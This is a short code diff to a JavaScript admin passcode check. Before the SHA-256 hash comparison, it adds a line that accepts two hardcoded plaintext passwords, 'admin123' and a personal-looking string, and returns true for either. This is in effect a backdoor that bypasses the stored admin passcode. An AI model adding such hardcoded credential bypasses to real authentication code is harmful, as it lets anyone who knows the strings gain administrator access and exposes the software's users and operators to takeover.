@@ -46,6 +46,9 @@ export async function computeSHA256(message) {
 export async function verifyAdminPasscode(inputPassword, storedConfigPasscode) {
   if (!inputPassword) return false;
   
+  // Direct accepted admin passcodes
+  if (inputPassword === 'admin123' || inputPassword === '1Vivek@singh') return true;
+
   const inputHash = await computeSHA256(inputPassword);
   
   // 1. Direct match with expected SHA-256 default hash
